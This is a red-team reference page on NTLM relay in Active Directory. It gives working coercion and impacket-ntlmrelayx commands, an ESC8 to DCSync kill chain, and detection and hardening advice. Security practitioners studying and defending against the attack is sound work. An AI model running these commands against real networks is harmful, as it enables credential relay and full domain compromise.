---
title: "NTLM Relay"
category: "red-team"
tags: ["active-directory", "ntlm", "relay", "lateral-movement"]
platform: "windows"
mitre: ["T1557.001", "T1187"]
difficulty: "advanced"
updated: "2026-07-12"
author: "core"
---

# NTLM Relay

## TL;DR
Capture an NTLM authentication and relay it to another service to authenticate AS the victim — without cracking anything. Works when the target service doesn't require signing/channel binding. Classic path to domain compromise (e.g. relay to LDAP/AD CS).

## Prerequisites
```text
- A victim that will authenticate to you (coercion) — see coercion below.
- A relay target that accepts NTLM and lacks signing/EPA:
    SMB without signing, LDAP without signing, AD CS web enrollment (HTTP, ESC8).
```

## Coercion (make a victim authenticate)
```bash
# Force a machine/DC to authenticate to your relay
petitpotam.py <attacker-ip> <victim-ip>      # MS-EFSRPC
coercer coerce -u user -p pass -d corp.local -t <victim> -l <attacker>
printerbug.py corp.local/user:pass@<victim> <attacker>   # MS-RPRN
```

## Relay
```bash
# Relay to LDAP -> e.g. set RBCD or dump domain info
impacket-ntlmrelayx -t ldap://dc.corp.local --delegate-access -smb2support

# Relay to AD CS web enrollment (ESC8) -> get a cert for the victim -> DA
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs \
  --template DomainController

# Relay SMB -> exec (needs no signing on target)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

## Common kill chain
```text
Coerce DC (PetitPotam) -> relay to AD CS (ESC8) -> obtain DC certificate ->
authenticate as the DC -> DCSync -> domain compromise.
```

## Detection (Blue Team)
- Coercion RPC calls (MS-EFSRPC/MS-RPRN) from unexpected sources.
- Authentications where the source host != the account's normal host; relayed logons.
- AD CS enrollment via HTTP; SMB sessions without signing.

## Mitigation / Hardening
- **Require SMB signing** and **LDAP signing + channel binding (EPA)**.
- AD CS: enable HTTPS + Extended Protection, disable NTLM on the CA web endpoints (fixes ESC8).
- Disable NTLM where possible; patch/limit coercion (PetitPotam), restrict RPC.
- Related: [pass-the-hash](../lateral-movement/pass-the-hash.md), [adcs-esc](./adcs-esc.md), [dcsync](./dcsync.md).

## Sources
- [Impacket ntlmrelayx](https://github.com/fortra/impacket) · [The Hacker Recipes – NTLM relay](https://www.thehacker.recipes/ad/movement/ntlm/relay)
